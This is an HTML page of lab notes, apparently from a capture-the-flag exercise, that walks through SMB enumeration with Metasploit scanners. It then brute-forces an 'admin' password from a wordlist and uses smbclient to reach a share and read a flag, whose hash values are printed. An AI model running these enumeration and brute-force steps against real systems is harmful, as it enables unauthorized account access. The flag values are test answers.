@@ -1,0 +1,141 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>SMB Enumeration</title>
+</head><body>server message block it works on LAN<br/>
+<br/>
+port is 445 or 139 on older version<br/>
+<br/>
+SAMBA is linux implementation of SMB in windows <br/>
+<br/>
+we can use auxiliary modules to enumerat SMB Versions<br/>
+<br/>
+Lab Started:<br/>
+<br/>
+Add the RHOSTS in global variables<br/>
+<br/>
+setg RHOSTS &lt;taget_ip&gt;<br/>
+<br/>
+search type:auxiliary <br/>
+<br/>
+we will go to the smb version for exploitation<br/>
+<br/>
+use auxiliary/scanner/smb/smb_version<br/>
+<br/>
+show options<br/>
+<br/>
+it must have the RHOSTS as we have added<br/>
+<br/>
+run<br/>
+<br/>
+Host couldnot be identified but it was revealed that samba 4.3.11-ubuntu is revealed<br/>
+<br/>
+use this version and if it is exploitable<br/>
+<br/>
+so we search the users<br/>
+<br/>
+smb_enumusr<br/>
+<br/>
+use auxiliary/scanner/smb/smb_enumusers<br/>
+<br/>
+<br/>
+RHOSTS are set<br/>
+<br/>
+hit run<br/>
+<br/>
+it will show the response SAMBA-RECON [users ]<br/>
+<br/>
+after users enumeration we can check for the shares so using the shares enumeration<br/>
+<br/>
+use auxiliary/scanner/smb/smb_enumshares<br/>
+<br/>
+show options reveal that there are showFiles options is set to false<br/>
+<br/>
+so run command<br/>
+<br/>
+Set SHOWFILES true<br/>
+&nbsp;<br/>
+then run<br/>
+<br/>
+it will give the shares done by specific users<br/>
+<br/>
+so if we recall we have a user admin in smb_enumusers and we can brute force it and can obtain the password<br/>
+<br/>
+use the use auxiliary/scanner/smb/smb_login<br/>
+<br/>
+show options reveal the RHOSTS that is set, port is 445 and the SMBUser is our interested part<br/>
+<br/>
+so set SMBUser admin<br/>
+<br/>
+set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords/.txt<br/>
+<br/>
+now run<br/>
+<br/>
+it reveals that admin username has password as "password"<br/>
+<br/>
+for further exploitation exit the metasploit framework<br/>
+<br/>
+run command <br/>
+<br/>
+smbclient -L \\\\\&lt;target_ip&gt;\\ -U admin<br/>
+<br/>
+it will ask the password and give it the password as password<br/>
+<br/>
+now access these listed shares<br/>
+<br/>
+use command<br/>
+<br/>
+smbclient \\\\&lt;target_ip&gt;//public -U admin<br/>
+<br/>
+add the password<br/>
+<br/>
+it will give you the access and <br/>
+<br/>
+use ls command and it will list down all directories<br/>
+<br/>
+in cd secret is the flag<br/>
+<br/>
+get flag<br/>
+<br/>
+cat flag 03ddb97933e716f5057a18632badb3b4<br/>
+<br/>
+a1157f23d040fb4bc6f9a7277de65bf7<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
